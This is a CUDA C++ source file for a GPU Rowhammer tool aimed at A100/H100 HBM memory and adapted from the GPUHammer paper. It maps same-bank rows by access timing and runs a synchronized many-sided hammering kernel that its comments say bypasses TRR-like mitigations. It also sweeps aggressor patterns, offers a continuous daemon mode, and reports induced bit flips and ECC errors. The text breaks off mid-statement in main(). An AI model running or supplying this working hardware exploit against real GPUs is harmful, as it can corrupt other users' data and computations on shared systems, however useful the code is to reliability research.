// gpu_hammer.cu – GPU Rowhammer ECC error trigger for HBM GPUs (Ampere/Hopper)
// Implements techniques from the GPUHammer paper adapted for HBM memory.
// Targets: A100 (HBM2e, sm_80), H100 (HBM3, sm_90)

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <csignal>
#include <cmath>
#include <climits>
#include <unistd.h>
#include <sys/time.h>
#include <time.h>

#include <cuda.h>
#include <cuda_runtime.h>
#include <nvml.h>

#include <vector>
#include <algorithm>

// ===================================================================
// Macros and globals
// ===================================================================

#define CUDA_CHECK(call) do {                                        \
    cudaError_t _e = (call);                                         \
    if (_e != cudaSuccess) {                                         \
        fprintf(stderr, "[CUDA] %s:%d %s -> %s\n",                  \
                __FILE__, __LINE__, #call, cudaGetErrorString(_e));   \
        exit(EXIT_FAILURE);                                          \
    }                                                                \
} while (0)

static volatile sig_atomic_t g_stop = 0;
static void on_signal(int) { g_stop = 1; }

static double now_sec() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return tv.tv_sec + tv.tv_usec * 1e-6;
}

static const char *timestamp() {
    static char buf[64];
    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", tm);
    return buf;
}

// ===================================================================
// Configuration
// ===================================================================

struct Config {
    int gpu            = 0;
    int n_sided        = 24;
    int distance       = 4;
    int duration_ms    = 128;
    int k_warps        = 8;
    int m_threads      = 0;       // 0 = auto (n_sided / k_warps)
    int rounds         = 1;
    int sync_delay     = 0;       // 0 = auto based on GPU type
    int num_banks      = 4;
    int max_iters      = 0;       // 0 = unlimited positions per bank
    bool daemon        = false;
    bool sweep         = false;   // sweep multiple patterns
    int cooldown       = 5;
    uint8_t victim     = 0xAA;
    uint8_t aggressor  = 0x55;
    size_t stride      = 0;       // 0 = auto-detect
    size_t reserve_mb  = 256;
    int scan_samples   = 30;
    bool verbose       = false;
};

static void usage(const char *prog) {
    printf(
        "GPU Rowhammer - ECC Error Trigger for HBM GPUs\n\n"
        "Usage: %s [options]\n\n"
        "GPU:\n"
        "  --gpu ID             GPU device ID (default: 0)\n\n"
        "Hammering:\n"
        "  --pattern N          N-sided aggressor pattern (default: 24)\n"
        "  --distance D         Row distance between aggressors (default: 4)\n"
        "  --duration MS        Hammer time per position in ms (default: 128)\n"
        "  --warps K            Number of warps (default: 8)\n"
        "  --threads M          Threads per warp (0=auto, default: 0)\n"
        "  --rounds R           ACTs per sync window (default: 1)\n"
        "  --sync-delay D       Delay iterations for REF sync (0=auto)\n\n"
        "Mapping:\n"
        "  --stride BYTES       Manual same-bank stride (0=auto, default: 0)\n"
        "  --banks N            Banks to test (default: 4)\n"
        "  --reserve MB         Memory to leave free in MB (default: 256)\n\n"
        "Data:\n"
        "  --victim HEX         Victim byte pattern (default: 0xAA)\n"
        "  --aggressor HEX      Aggressor byte pattern (default: 0x55)\n\n"
        "Execution:\n"
        "  --iterations N       Max positions per bank (0=all, default: 0)\n"
        "  --daemon             Continuous mode with auto-restart\n"
        "  --sweep              Sweep through multiple n-sided patterns and data\n"
        "  --cooldown SEC       Pause between daemon runs (default: 5)\n"
        "  --verbose            Verbose output\n"
        "  --help               This message\n",
        prog);
}

static Config parse_args(int argc, char **argv) {
    Config c;
    for (int i = 1; i < argc; i++) {
        auto next = [&]() -> const char * {
            if (i + 1 >= argc) {
                fprintf(stderr, "Missing value for %s\n", argv[i]);
                exit(1);
            }
            return argv[++i];
        };
        if      (!strcmp(argv[i], "--gpu"))        c.gpu = atoi(next());
        else if (!strcmp(argv[i], "--pattern"))    c.n_sided = atoi(next());
        else if (!strcmp(argv[i], "--distance"))   c.distance = atoi(next());
        else if (!strcmp(argv[i], "--duration"))   c.duration_ms = atoi(next());
        else if (!strcmp(argv[i], "--warps"))      c.k_warps = atoi(next());
        else if (!strcmp(argv[i], "--threads"))    c.m_threads = atoi(next());
        else if (!strcmp(argv[i], "--rounds"))     c.rounds = atoi(next());
        else if (!strcmp(argv[i], "--sync-delay")) c.sync_delay = atoi(next());
        else if (!strcmp(argv[i], "--banks"))      c.num_banks = atoi(next());
        else if (!strcmp(argv[i], "--iterations")) c.max_iters = atoi(next());
        else if (!strcmp(argv[i], "--daemon"))     c.daemon = true;
        else if (!strcmp(argv[i], "--sweep"))      c.sweep = true;
        else if (!strcmp(argv[i], "--cooldown"))   c.cooldown = atoi(next());
        else if (!strcmp(argv[i], "--victim"))     c.victim = (uint8_t)strtoul(next(), NULL, 16);
        else if (!strcmp(argv[i], "--aggressor"))  c.aggressor = (uint8_t)strtoul(next(), NULL, 16);
        else if (!strcmp(argv[i], "--stride"))     c.stride = strtoul(next(), NULL, 0);
        else if (!strcmp(argv[i], "--reserve"))    c.reserve_mb = strtoul(next(), NULL, 0);
        else if (!strcmp(argv[i], "--scan-samples")) c.scan_samples = atoi(next());
        else if (!strcmp(argv[i], "--verbose"))    c.verbose = true;
        else if (!strcmp(argv[i], "--help"))       { usage(argv[0]); exit(0); }
        else { fprintf(stderr, "Unknown option: %s\n", argv[i]); exit(1); }
    }
    if (c.m_threads == 0) {
        c.m_threads = c.n_sided / c.k_warps;
        if (c.n_sided % c.k_warps != 0) {
            c.m_threads++;
            c.n_sided = c.k_warps * c.m_threads;
            fprintf(stderr, "Note: adjusted pattern to %d (k=%d * m=%d)\n",
                    c.n_sided, c.k_warps, c.m_threads);
        }
    }
    return c;
}

// ===================================================================
// ECC Monitor (NVML)
// ===================================================================

struct ECCSnap {
    unsigned long long corr_vol  = 0;
    unsigned long long uncorr_vol = 0;
    unsigned long long corr_agg  = 0;
    unsigned long long uncorr_agg = 0;
    unsigned int gpu_temp        = 0;
    bool ok = false;
};

struct ECCMon {
    nvmlDevice_t dev{};
    bool ready = false;

    bool init(int gpu) {
        if (nvmlInit_v2() != NVML_SUCCESS) return false;
        if (nvmlDeviceGetHandleByIndex_v2(gpu, &dev) != NVML_SUCCESS) return false;
        ready = true;
        return true;
    }

    ECCSnap snap() {
        ECCSnap s;
        if (!ready) return s;

        nvmlReturn_t r;
        r = nvmlDeviceGetMemoryErrorCounter(dev, NVML_MEMORY_ERROR_TYPE_CORRECTED,
                NVML_VOLATILE_ECC, NVML_MEMORY_LOCATION_DEVICE_MEMORY, &s.corr_vol);
        if (r != NVML_SUCCESS)
            nvmlDeviceGetTotalEccErrors(dev, NVML_MEMORY_ERROR_TYPE_CORRECTED,
                    NVML_VOLATILE_ECC, &s.corr_vol);

        r = nvmlDeviceGetMemoryErrorCounter(dev, NVML_MEMORY_ERROR_TYPE_UNCORRECTED,
                NVML_VOLATILE_ECC, NVML_MEMORY_LOCATION_DEVICE_MEMORY, &s.uncorr_vol);
        if (r != NVML_SUCCESS)
            nvmlDeviceGetTotalEccErrors(dev, NVML_MEMORY_ERROR_TYPE_UNCORRECTED,
                    NVML_VOLATILE_ECC, &s.uncorr_vol);

        nvmlDeviceGetMemoryErrorCounter(dev, NVML_MEMORY_ERROR_TYPE_CORRECTED,
                NVML_AGGREGATE_ECC, NVML_MEMORY_LOCATION_DEVICE_MEMORY, &s.corr_agg);
        nvmlDeviceGetMemoryErrorCounter(dev, NVML_MEMORY_ERROR_TYPE_UNCORRECTED,
                NVML_AGGREGATE_ECC, NVML_MEMORY_LOCATION_DEVICE_MEMORY, &s.uncorr_agg);

        nvmlDeviceGetTemperature(dev, NVML_TEMPERATURE_GPU, &s.gpu_temp);
        s.ok = true;
        return s;
    }

    void print(const ECCSnap &s) {
        if (!s.ok) { printf("  ECC: unavailable\n"); return; }
        printf("  Volatile  – correctable: %llu  uncorrectable: %llu\n",
               s.corr_vol, s.uncorr_vol);
        printf("  Aggregate – correctable: %llu  uncorrectable: %llu\n",
               s.corr_agg, s.uncorr_agg);
        printf("  GPU temp:   %u C\n", s.gpu_temp);
    }

    bool has_new(const ECCSnap &a, const ECCSnap &b) {
        if (!a.ok || !b.ok) return false;
        return b.corr_vol > a.corr_vol || b.uncorr_vol > a.uncorr_vol;
    }

    void show_diff(const ECCSnap &a, const ECCSnap &b) {
        if (!a.ok || !b.ok) return;
        long long dc = (long long)(b.corr_vol - a.corr_vol);
        long long du = (long long)(b.uncorr_vol - a.uncorr_vol);
        if (dc > 0 || du > 0)
            printf("  >>> NEW ECC: +%lld correctable, +%lld uncorrectable <<<\n", dc, du);
    }

    void fini() { if (ready) { nvmlShutdown(); ready = false; } }
};

// ===================================================================
// CUDA Kernels
// ===================================================================

// Measure single-address memory access latency (for NUMA characterization)
__global__ void kern_single_lat(volatile uint8_t *base, size_t off,
                                uint32_t *out, int samples) {
    uint64_t d;
    volatile uint8_t *a = base + off;
    uint32_t tot = 0;
    for (int s = 0; s < samples; s++) {
        asm volatile("discard.global.L2 [%0], 128;" :: "l"(a));
        __threadfence();
        uint32_t t0 = clock();
        asm volatile("ld.u64.global.volatile %0, [%1];" : "=l"(d) : "l"(a));
        uint32_t t1 = clock();
        tot += t1 - t0;
    }
    *out = tot / samples;
}

// Measure pair access latency for row-buffer conflict detection
__global__ void kern_pair_lat(volatile uint8_t *base, size_t ref_off,
                              const size_t *offs, uint32_t *lats,
                              int n, int samples) {
    uint64_t d;
    volatile uint8_t *ref = base + ref_off;
    for (int c = 0; c < n; c++) {
        volatile uint8_t *tst = base + offs[c];
        uint32_t tot = 0;
        for (int s = 0; s < samples; s++) {
            asm volatile("discard.global.L2 [%0], 128;" :: "l"(ref));
            asm volatile("discard.global.L2 [%0], 128;" :: "l"(tst));
            __threadfence();
            uint32_t t0 = clock();
            asm volatile("ld.u64.global.volatile %0, [%1];" : "=l"(d) : "l"(ref));
            asm volatile("ld.u64.global.volatile %0, [%1];" : "=l"(d) : "l"(tst));
            uint32_t t1 = clock();
            tot += t1 - t0;
        }
        lats[c] = tot / samples;
    }
}

// Fill memory with a byte pattern
__global__ void kern_fill(uint8_t *mem, size_t n, uint8_t val) {
    size_t i = (size_t)blockIdx.x * blockDim.x + threadIdx.x;
    size_t s = (size_t)blockDim.x * gridDim.x;
    for (; i < n; i += s) mem[i] = val;
}

// Check memory against expected pattern, count mismatches
__global__ void kern_check(const uint8_t *mem, size_t n, uint8_t expect,
                           unsigned long long *cnt,
                           unsigned long long *first_off,
                           uint8_t *first_got) {
    size_t i = (size_t)blockIdx.x * blockDim.x + threadIdx.x;
    size_t s = (size_t)blockDim.x * gridDim.x;
    for (; i < n; i += s) {
        if (mem[i] != expect) {
            atomicAdd(cnt, 1ULL);
            unsigned long long prev = atomicMin(first_off, (unsigned long long)i);
            if ((unsigned long long)i < prev)
                *first_got = mem[i];
        }
    }
}

// k-warp, m-thread-per-warp synchronized Rowhammer kernel.
// Each active thread hammers one aggressor address.
// Delay loops after each round create memory controller bubbles
// for REF command insertion, bypassing TRR-like mitigations.
__global__ void kern_hammer(volatile uint8_t * const *addrs,
                            int k, int m, int rounds,
                            int sync_delay, uint64_t dur_ns) {
    uint64_t d, ds = 0;
    int wid = threadIdx.x >> 5;
    int lid = threadIdx.x & 31;
    bool active = (wid < k && lid < m);

    volatile uint8_t *a = nullptr;
    if (active) {
        a = addrs[lid + wid * m];
        asm volatile("discard.global.L2 [%0], 128;" :: "l"(a));
    }
    __syncthreads();
    if (!active) return;

    uint64_t t_start;
    asm volatile("mov.u64 %0, %%globaltimer;" : "=l"(t_start));
    uint64_t t_end = t_start + dur_ns;

    for (;;) {
        // Inner loop: 512 synchronized rounds before checking timer
        for (int c = 0; c < 512; c++) {
            for (int r = 0; r < rounds; r++) {
                asm volatile("discard.global.L2 [%0], 128;" :: "l"(a));
                asm volatile("ld.u64.global.volatile %0, [%1];" : "=l"(d) : "l"(a));
                __threadfence_block();
            }
            // Per-warp delay for REF synchronization: overlapping delays
            // across warps create a bubble at the memory controller
            for (int i = 0; i < sync_delay; i++)
                ds += d;
        }
        uint64_t t_now;
        asm volatile("mov.u64 %0, %%globaltimer;" : "=l"(t_now));
        if (t_now >= t_end) break;
    }
    // Prevent dead-code elimination
    if (ds == 0xCAFEBABEDEADBEEFULL)
        const_cast<volatile uint8_t **>(addrs)[0] = (volatile uint8_t *)ds;
}

// ===================================================================
// Host-side memory helpers
// ===================================================================

static void gpu_fill(uint8_t *d, size_t n, uint8_t v) {
    int thr = 256;
    int blk = (int)std::min((size_t)65535, (n + thr - 1) / thr);
    kern_fill<<<blk, thr>>>(d, n, v);
    CUDA_CHECK(cudaDeviceSynchronize());
}

struct FlipResult { int count; size_t offset; uint8_t expected; uint8_t got; };

static FlipResult gpu_check(const uint8_t *d, size_t n, uint8_t expect) {
    unsigned long long *d_cnt, *d_first;
    uint8_t *d_got;
    CUDA_CHECK(cudaMalloc(&d_cnt, 8));
    CUDA_CHECK(cudaMalloc(&d_first, 8));
    CUDA_CHECK(cudaMalloc(&d_got, 1));
    unsigned long long z = 0, mx = ULLONG_MAX;
    uint8_t gz = 0;
    CUDA_CHECK(cudaMemcpy(d_cnt, &z, 8, cudaMemcpyHostToDevice));
    CUDA_CHECK(cudaMemcpy(d_first, &mx, 8, cudaMemcpyHostToDevice));
    CUDA_CHECK(cudaMemcpy(d_got, &gz, 1, cudaMemcpyHostToDevice));

    int thr = 256;
    int blk = (int)std::min((size_t)65535, (n + thr - 1) / thr);
    kern_check<<<blk, thr>>>(d, n, expect, d_cnt, d_first, d_got);
    CUDA_CHECK(cudaDeviceSynchronize());

    unsigned long long h_cnt, h_first;
    uint8_t h_got;
    CUDA_CHECK(cudaMemcpy(&h_cnt, d_cnt, 8, cudaMemcpyDeviceToHost));
    CUDA_CHECK(cudaMemcpy(&h_first, d_first, 8, cudaMemcpyDeviceToHost));
    CUDA_CHECK(cudaMemcpy(&h_got, d_got, 1, cudaMemcpyDeviceToHost));
    CUDA_CHECK(cudaFree(d_cnt));
    CUDA_CHECK(cudaFree(d_first));
    CUDA_CHECK(cudaFree(d_got));

    FlipResult r{};
    r.count = (int)h_cnt;
    r.offset = (size_t)h_first;
    r.expected = expect;
    r.got = h_got;
    return r;
}

// ===================================================================
// Bank / Row Mapping
// ===================================================================

struct BankMap {
    size_t ref_offset;
    std::vector<size_t> rows;
};

static uint32_t single_lat(uint8_t *base, size_t off, int samp) {
    uint32_t *d_l;
    CUDA_CHECK(cudaMalloc(&d_l, 4));
    kern_single_lat<<<1, 1>>>((volatile uint8_t *)base, off, d_l, samp);
    CUDA_CHECK(cudaDeviceSynchronize());
    uint32_t h;
    CUDA_CHECK(cudaMemcpy(&h, d_l, 4, cudaMemcpyDeviceToHost));
    CUDA_CHECK(cudaFree(d_l));
    return h;
}

// Auto-detect the stride that yields row-buffer conflicts (same-bank access)
static size_t detect_stride(uint8_t *base, size_t sz, int samp, bool verbose) {
    uint32_t ref_lat = single_lat(base, 0, samp);
    if (verbose)
        printf("  Reference single-access latency: %u cycles\n", ref_lat);

    // Threshold: ~17% above reference (accounts for NUMA noise)
    uint32_t thr = ref_lat + ref_lat / 6;

    // Candidate strides include common HBM bank interleaving periods:
    //   HBM2e (A100): 8 pseudo-ch * 16 banks = 128 banks * 256B = 32KB
    //   HBM3  (H100): varies; try a range
    const size_t candidates[] = {
        256, 512, 1024, 2048,
        4096, 8192, 16384, 32768,
        65536, 131072, 262144, 524288, 1048576, 2097152
    };

    size_t *d_off;
    uint32_t *d_lat;
    CUDA_CHECK(cudaMalloc(&d_off, 8));
    CUDA_CHECK(cudaMalloc(&d_lat, 4));

    size_t best = 0;
    float best_rate = 0;

    for (size_t stride : candidates) {
        if (stride >= sz) continue;
        int hits = 0, tests = 0;
        for (int mult = 1; mult <= 20 && (size_t)mult * stride < sz; mult++) {
            size_t o = (size_t)mult * stride;
            CUDA_CHECK(cudaMemcpy(d_off, &o, 8, cudaMemcpyHostToDevice));
            kern_pair_lat<<<1, 1>>>((volatile uint8_t *)base, 0,
                                    d_off, d_lat, 1, samp);
            CUDA_CHECK(cudaDeviceSynchronize());
            uint32_t l;
            CUDA_CHECK(cudaMemcpy(&l, d_lat, 4, cudaMemcpyDeviceToHost));
            tests++;
            if (l > thr) hits++;
        }
        float rate = (float)hits / tests;
        if (verbose)
            printf("  stride %9zu: conflict %.0f%% (%d/%d)\n",
                   stride, rate * 100, hits, tests);
        if (rate > best_rate && rate > 0.5) {
            best = stride;
            best_rate = rate;
        }
    }

    CUDA_CHECK(cudaFree(d_off));
    CUDA_CHECK(cudaFree(d_lat));
    return best;
}

// Build bank maps using a known stride
static std::vector<BankMap> build_banks_stride(
        uint8_t *base, size_t sz, size_t stride,
        int num_banks, bool verbose) {
    std::vector<BankMap> banks;
    for (int b = 0; b < num_banks; b++) {
        BankMap bm;
        bm.ref_offset = (size_t)b * 256;
        int max_rows = (int)(sz / stride);
        if (max_rows > 65536) max_rows = 65536;
        for (int r = 0; r < max_rows; r++) {
            size_t o = bm.ref_offset + (size_t)r * stride;
            if (o >= sz) break;
            bm.rows.push_back(o);
        }
        banks.push_back(bm);
        if (verbose)
            printf("  Bank %d: %zu rows (ref=0x%lx, stride=%zu)\n",
                   b, bm.rows.size(), (unsigned long)bm.ref_offset, stride);
    }
    return banks;
}

// Build bank maps using timing-based conflict scan (slower, more accurate)
static std::vector<BankMap> build_banks_timing(
        uint8_t *base, size_t sz, int num_banks,
        size_t scan_step, int samples, bool verbose) {
    const int BATCH = 2048;
    size_t *d_offs;
    uint32_t *d_lats;
    CUDA_CHECK(cudaMalloc(&d_offs, BATCH * 8));
    CUDA_CHECK(cudaMalloc(&d_lats, BATCH * 4));
    std::vector<size_t> h_offs(BATCH);
    std::vector<uint32_t> h_lats(BATCH);

    std::vector<BankMap> banks;

    for (int b = 0; b < num_banks && !g_stop; b++) {
        size_t ref = (size_t)b * (sz / num_banks);
        ref = (ref / 256) * 256;

        uint32_t ref_lat = single_lat(base, ref, samples);
        uint32_t thr = ref_lat + ref_lat / 6;

        if (verbose)
            printf("  Bank %d: ref=0x%lx lat=%u thr=%u scanning...\n",
                   b, (unsigned long)ref, ref_lat, thr);

        BankMap bm;
        bm.ref_offset = ref;
        size_t total = sz / scan_step;
        size_t done = 0;

        for (size_t pos = 0; pos < sz && !g_stop;) {
            int n = 0;
            for (; pos < sz && n < BATCH; pos += scan_step) {
                if (pos == ref) continue;
                h_offs[n++] = pos;
            }
            if (n == 0) break;

            CUDA_CHECK(cudaMemcpy(d_offs, h_offs.data(), n * 8, cudaMemcpyHostToDevice));
            kern_pair_lat<<<1, 1>>>((volatile uint8_t *)base, ref,
                                    d_offs, d_lats, n, samples);
            CUDA_CHECK(cudaDeviceSynchronize());
            CUDA_CHECK(cudaMemcpy(h_lats.data(), d_lats, n * 4, cudaMemcpyDeviceToHost));

            for (int i = 0; i < n; i++)
                if (h_lats[i] > thr) bm.rows.push_back(h_offs[i]);

            done += n;
            if (verbose && done % (BATCH * 20) == 0)
                printf("\r    Scanned %.1f%% – %zu conflicts",
                       100.0 * done / total, bm.rows.size());
        }
        if (verbose) printf("\n    Found %zu same-bank addresses\n", bm.rows.size());

        std::sort(bm.rows.begin(), bm.rows.end());
        banks.push_back(bm);
    }

    CUDA_CHECK(cudaFree(d_offs));
    CUDA_CHECK(cudaFree(d_lats));
    return banks;
}

// ===================================================================
// Sweep configurations for --sweep mode
// ===================================================================

struct SweepEntry {
    int n_sided;
    int distance;
    uint8_t victim;
    uint8_t aggressor;
    const char *label;
};

static const SweepEntry SWEEP_TABLE[] = {
    {24, 4, 0xAA, 0x55, "24-sided d4 AA/55"},
    {24, 4, 0x55, 0xAA, "24-sided d4 55/AA"},
    {20, 4, 0xAA, 0x55, "20-sided d4 AA/55"},
    {20, 4, 0x55, 0xAA, "20-sided d4 55/AA"},
    {16, 4, 0xAA, 0x55, "16-sided d4 AA/55"},
    {12, 4, 0xAA, 0x55, "12-sided d4 AA/55"},
    { 8, 4, 0xAA, 0x55, " 8-sided d4 AA/55"},
    {24, 2, 0xAA, 0x55, "24-sided d2 AA/55"},
    {24, 2, 0x55, 0xAA, "24-sided d2 55/AA"},
    {24, 4, 0x00, 0xFF, "24-sided d4 00/FF"},
    {24, 4, 0xFF, 0x00, "24-sided d4 FF/00"},
    {32, 4, 0xAA, 0x55, "32-sided d4 AA/55"},
};
static const int SWEEP_COUNT = sizeof(SWEEP_TABLE) / sizeof(SWEEP_TABLE[0]);

// ===================================================================
// Hammer Campaign
// ===================================================================

struct CampaignStats {
    int ecc_events = 0;
    int bitflips   = 0;
};

static void run_campaign(
        uint8_t *d_mem, size_t mem_sz,
        const std::vector<BankMap> &banks,
        int n_sided, int distance,
        uint8_t victim_pat, uint8_t aggr_pat,
        int k_warps, int m_threads,
        int rounds, int sync_delay,
        int duration_ms, int max_iters,
        bool verbose, ECCMon &ecc,
        CampaignStats &stats) {

    // Re-derive k/m to match n_sided
    if (n_sided != k_warps * m_threads) {
        m_threads = n_sided / k_warps;
        if (n_sided % k_warps != 0) {
            m_threads++;
            n_sided = k_warps * m_threads;
        }
    }

    printf("\n[%s] Campaign: %d-sided  dist=%d  v=0x%02X a=0x%02X  "
           "k=%d m=%d  dur=%dms\n",
           timestamp(), n_sided, distance, victim_pat, aggr_pat,
           k_warps, m_threads, duration_ms);

    ECCSnap ecc_camp_start = ecc.snap();

    printf("  Filling %.1f GB with victim 0x%02X...\n",
           mem_sz / 1e9, victim_pat);
    gpu_fill(d_mem, mem_sz, victim_pat);

    uint64_t dur_ns = (uint64_t)duration_ms * 1000000ULL;
    int positions_total = 0;

    for (int bi = 0; bi < (int)banks.size() && !g_stop; bi++) {
        const BankMap &bk = banks[bi];
        int nrows = (int)bk.rows.size();
        int span = n_sided * distance;

        if (nrows < span) {
            if (verbose)
                printf("  Bank %d: skip (%d rows < span %d)\n", bi, nrows, span);
            continue;
        }

        int max_pos = nrows - span;
        int limit = (max_iters > 0) ? std::min(max_iters, max_pos + 1) : max_pos + 1;
        int tested = 0;

        for (int pos = 0; pos <= max_pos && tested < limit && !g_stop;
             pos += 3, tested++) {

            positions_total++;

            // Collect n aggressor offsets
            std::vector<volatile uint8_t *> h_addrs(n_sided);
            std::vector<size_t> agg_offs(n_sided);
            bool valid = true;
            for (int i = 0; i < n_sided; i++) {
                int ri = pos + i * distance;
                if (ri >= nrows) { valid = false; break; }
                agg_offs[i] = bk.rows[ri];
                h_addrs[i] = (volatile uint8_t *)(d_mem + bk.rows[ri]);
            }
            if (!valid) break;

            // Fill aggressor rows with inverted pattern
            for (int i = 0; i < n_sided; i++)
                gpu_fill(d_mem + agg_offs[i], 256, aggr_pat);

            // Upload address array to device
            void *d_addrs_raw;
            CUDA_CHECK(cudaMalloc(&d_addrs_raw, n_sided * sizeof(void *)));
            CUDA_CHECK(cudaMemcpy(d_addrs_raw, h_addrs.data(),
                                  n_sided * sizeof(void *),
                                  cudaMemcpyHostToDevice));

            ECCSnap e0 = ecc.snap();

            int total_threads = k_warps * 32;
            if (total_threads > 1024) total_threads = 1024;
            kern_hammer<<<1, total_threads>>>(
                    (volatile uint8_t *const *)d_addrs_raw,
                    k_warps, m_threads,
                    rounds, sync_delay, dur_ns);
            CUDA_CHECK(cudaDeviceSynchronize());

            CUDA_CHECK(cudaFree(d_addrs_raw));

            // Check ECC counters
            ECCSnap e1 = ecc.snap();
            if (ecc.has_new(e0, e1)) {
                printf("\n  !!!! ECC ERROR – bank %d pos %d (temp %u C) !!!!\n",
                       bi, pos, e1.gpu_temp);
                ecc.show_diff(e0, e1);
                stats.ecc_events++;
            }

            // Check victim data between each pair of adjacent aggressors
            for (int i = 0; i < n_sided - 1; i++) {
                size_t vs = agg_offs[i] + 256;
                size_t ve = agg_offs[i + 1];
                if (ve <= vs || ve - vs > mem_sz) continue;

                FlipResult fr = gpu_check(d_mem + vs, ve - vs, victim_pat);
                if (fr.count > 0) {
                    stats.bitflips += fr.count;
                    size_t abs_off = vs + fr.offset;
                    printf("\n  !!!! BIT FLIP – bank %d pos %d !!!!\n", bi, pos);
                    printf("  Offset: 0x%lx  Expected: 0x%02X  Got: 0x%02X  "
                           "XOR: 0x%02X  Count: %d\n",
                           (unsigned long)abs_off, fr.expected, fr.got,
                           fr.expected ^ fr.got, fr.count);
                    // Restore for subsequent tests
                    gpu_fill(d_mem + vs, ve - vs, victim_pat);
                }
            }

            // Also check the row just before the first aggressor
            if (agg_offs[0] >= 256) {
                size_t vs = agg_offs[0] - 256;
                FlipResult fr = gpu_check(d_mem + vs, 256, victim_pat);
                if (fr.count > 0) {
                    stats.bitflips += fr.count;
                    printf("\n  !!!! BIT FLIP (before aggr) – bank %d pos %d !!!!\n",
                           bi, pos);
                    printf("  Offset: 0x%lx  Expected: 0x%02X  Got: 0x%02X  "
                           "XOR: 0x%02X\n",
                           (unsigned long)(vs + fr.offset), fr.expected, fr.got,
                           fr.expected ^ fr.got);
                    gpu_fill(d_mem + vs, 256, victim_pat);
                }
            }

            // Also check the row just after the last aggressor
            if (agg_offs[n_sided - 1] + 512 <= mem_sz) {
                size_t vs = agg_offs[n_sided - 1] + 256;
                FlipResult fr = gpu_check(d_mem + vs, 256, victim_pat);
                if (fr.count > 0) {
                    stats.bitflips += fr.count;
                    printf("\n  !!!! BIT FLIP (after aggr) – bank %d pos %d !!!!\n",
                           bi, pos);
                    printf("  Offset: 0x%lx  Expected: 0x%02X  Got: 0x%02X  "
                           "XOR: 0x%02X\n",
                           (unsigned long)(vs + fr.offset), fr.expected, fr.got,
                           fr.expected ^ fr.got);
                    gpu_fill(d_mem + vs, 256, victim_pat);
                }
            }

            if (!verbose && tested % 100 == 0) {
                printf("\r  Bank %d: %d/%d positions (ECC:%d flips:%d)",
                       bi, tested, limit, stats.ecc_events, stats.bitflips);
                fflush(stdout);
            }
            if (verbose)
                printf("  [bank%d pos%d] done\n", bi, pos);
        }
        printf("\n");
    }

    ECCSnap ecc_camp_end = ecc.snap();
    printf("  Campaign done – %d positions tested\n", positions_total);
    ecc.show_diff(ecc_camp_start, ecc_camp_end);
    printf("  Running totals – ECC: %d  Bit flips: %d\n",
           stats.ecc_events, stats.bitflips);
}

// ===================================================================
// Main
// ===================================================================

int main(int argc, char **argv) {
    Config cfg = parse_args(argc, argv);

    signal(SIGINT, on_signal);
    signal(SIGTERM, on_signal);

    printf("==========================================================\n");
    printf("  GPU Rowhammer – ECC Error Trigger for HBM GPUs\n");
    printf("  Based on GPUHammer paper (Ampere/Hopper targets)\n");
    printf("==========================================================\n\n");

    // ---- GPU info ----
    int dev_count;
    CUDA_CHECK(cudaGetDeviceCount(&dev_count));
    if (cfg.gpu >= dev_count) {
        fprintf(stderr, "GPU %d not found (%d available)\n", cfg.gpu, dev_count);
        return 1;
    }
    CUDA_CHECK(cudaSetDevice(cfg.gpu));

    cudaDeviceProp prop;
    CUDA_CHECK(cudaGetDeviceProperties(&prop, cfg.gpu));
    size_t free_mem, total_mem;
    CUDA_CHECK(cudaMemGetInfo(&free_mem, &total_mem));

    printf("[GPU %d] %s\n", cfg.gpu, prop.name);
    printf("  Compute:  sm_%d%d   SMs: %d\n", prop.major, prop.minor,
           prop.multiProcessorCount);
    printf("  Memory:   %.1f GB total, %.1f GB free\n",
           total_mem / 1e9, free_mem / 1e9);
    printf("  ECC:      %s\n", prop.ECCEnabled ? "ENABLED" : "DISABLED");

    if (prop.major < 8) {
        fprintf(stderr, "Error: sm_80+ required (Ampere or newer) for "
                        "discard instruction.\n");
        return 1;
    }

    bool is_hbm = strstr(prop.name, "A100") || strstr(prop.name, "H100") ||
                  strstr(prop.name, "H200") || strstr(prop.name, "B100") ||
                  strstr(prop.name, "B200") || strstr(prop.name, "GH200");
    printf("  Type:     %s (heuristic)\n", is_hbm ? "HBM" : "GDDR");

    if (!prop.ECCEnabled) {
        printf("\n  WARNING: ECC is OFF. Enable with:\n"
               "    nvidia-smi --ecc-config=1 -i %d\n"
               "  Then reboot. Continuing (bit-flip detection still works).\n",
               cfg.gpu);
    }

    // Auto sync_delay based on GPU type if not specified
    // HBM has tREFI ~3.9us vs GDDR6 ~1.4us, so needs larger delay
    if (cfg.sync_delay == 0)
        cfg.sync_delay = is_hbm ? 500 : 200;

    // ---- ECC monitor ----
    ECCMon ecc;
    if (ecc.init(cfg.gpu)) {
        ECCSnap s0 = ecc.snap();
        printf("\nInitial ECC state:\n");
        ecc.print(s0);
    } else {
        printf("\nECC monitoring unavailable (NVML init failed)\n");
    }

    // ---- Allocate GPU memory ----
    size_t reserve = cfg.reserve_mb << 20;
    size_t alloc_sz = (free_mem > reserve) ? free_mem - reserve : free_mem / 2;
    alloc_sz = (alloc_sz / 4096) * 4096;

    printf("\nAllocating %.2f GB of GPU memory...\n", alloc_sz / 1e9);
    uint8_t *d_mem = nullptr;
    while (alloc_sz > (1ULL << 30)) {
        cudaError_t e = cudaMalloc(&d_mem, alloc_sz);
        if (e == cudaSuccess) break;
        alloc_sz -= (64ULL << 20);
        d_mem = nullptr;
    }
    if (!d_mem) {
        fprintf(stderr, "Failed to allocate GPU memory\n");
        return 1;
    }
    printf("Allocated %.2f GB at device ptr %p\n", alloc_sz / 1e9, d_mem);

    // ---- Bank mapping ----
    printf("\n--- Bank Mapping Phase ---\n");
    std::vector<BankMap> banks;

    if (cfg.stride > 0) {
        printf("Using manual stride: %zu bytes\n", cfg.stride);
        banks = build_banks_stride(d_mem, alloc_sz, cfg.stride,
                                   cfg.num_banks, cfg.verbose);
    } else {
        printf("Auto-detecting bank stride...\n");
        size_t stride = detect_stride(d_mem, alloc_sz,
                                       cfg.scan_samples, cfg.verbose);
        if (stride > 0) {
            printf("Detected stride: %zu bytes\n", stride);
            banks = build_banks_stride(d_mem, alloc_sz, stride,
                                       cfg.num_banks, cfg.verbose);
        } else {
            printf("Stride detection inconclusive – using timing-based scan\n");
            printf("(This may take several minutes per bank...)\n");
            banks = build_banks_timing(d_mem, alloc_sz, cfg.num_banks,
